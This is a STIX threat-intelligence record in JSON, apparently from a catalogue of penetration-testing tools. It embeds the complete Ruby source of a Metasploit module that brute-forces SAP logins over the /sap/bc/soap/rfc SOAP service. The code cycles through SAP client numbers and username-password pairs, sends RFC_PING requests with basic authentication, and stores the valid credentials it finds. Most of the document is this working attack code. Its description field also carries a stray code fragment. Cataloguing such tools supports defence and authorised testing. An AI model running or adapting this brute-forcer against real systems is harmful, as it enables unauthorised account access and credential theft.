{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0b3f7e42-0bfc-4d0a-886b-180a377d126a",
    "created": "2024-08-14T16:27:01.280404Z",
    "modified": "2024-08-14T16:27:01.280408Z",
    "name": "SAP SOAP Service RFC_PING Login Brute Forcer",
    "description": " This module attempts to brute force SAP username and passwords through the /sap/bc/soap/rfc SOAP service, using RFC_PING function.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_brute_login.rb",
            "external_id": "sap_soap_rfc_brute_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP Service RFC_PING Login Brute Forcer',\n      'Description' => %q{\n        This module attempts to brute force SAP username and passwords through the\n        /sap/bc/soap/rfc SOAP service, using RFC_PING function.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),\n        OptString.new('TARGETURI', [true, 'The base path to the SOAP RFC Service', '/sap/bc/soap/rfc']),\n        OptPath.new('USERPASS_FILE', [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"sap_default.txt\") ])\n      ])\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(rhost)\n    client_list = []\n    if datastore['CLIENT'] =~ /^\\d{3},/\n      client_list = datastore['CLIENT'].split(/,/)\n      print_status(\"Brute forcing clients #{datastore['CLIENT']}\")\n    elsif datastore['CLIENT'] =~ /^\\d{3}-\\d{3}\\z/\n      array = datastore['CLIENT'].split(/-/)\n      client_list = (array.at(0)..array.at(1)).to_a\n      print_status(\"Brute forcing clients #{datastore['CLIENT']}\")\n    elsif datastore['CLIENT'] =~ /^\\d{3}\\z/\n      client_list.push(datastore['CLIENT'])\n      print_status(\"Brute forcing client #{datastore['CLIENT']}\")\n    else\n      fail_with(Failure::BadConfig, \"Invalid CLIENT\")\n    end\n\n    saptbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"[SAP] #{peer} Credentials\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent'  => 1,\n      'Columns' =>\n        [\n          \"host\",\n          \"port\",\n          \"client\",\n          \"user\",\n          \"pass\"\n        ])\n\n    client_list.each do |c|\n      print_status(\"#{peer} [SAP] Trying client: #{c}\")\n      each_user_pass do |u, p|\n        vprint_status(\"#{peer} [SAP] Trying #{c}:#{u}:#{p}\")\n        begin\n          success = bruteforce(u, p, c)\n          saptbl << [ rhost, rport, c, u, p] if success\n        rescue ::Rex::ConnectionError\n          print_error(\"#{peer} [SAP] Not responding\")\n          return\n        end\n      end\n    end\n\n    if saptbl.rows.count > 0\n      print_line saptbl.to_s\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def bruteforce(username,password,client)\n    uri = normalize_uri(target_uri.path)\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:RFC_PING xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '</n1:RFC_PING>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'POST',\n      'vars_get' => {\n        'sap-client' => client,\n        'sap-language' => 'EN'\n      },\n      'data' => data,\n      'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{client}\",\n      'ctype' => 'text/xml; charset=UTF-8',\n      'authorization' => basic_auth(username, password),\n      'encode_params' => false,\n      'headers' =>\n        {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        }\n    })\n\n    if res && res.code == 200 && res.body.include?('RFC_PING')\n      print_good(\"#{peer} [SAP] Client #{client}, valid credentials #{username}:#{password}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'sap',\n        user: username,\n        password: password,\n        proof: \"SAP Client: #{client}\"\n      )\n      return true\n    end\n\n    false\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ]
}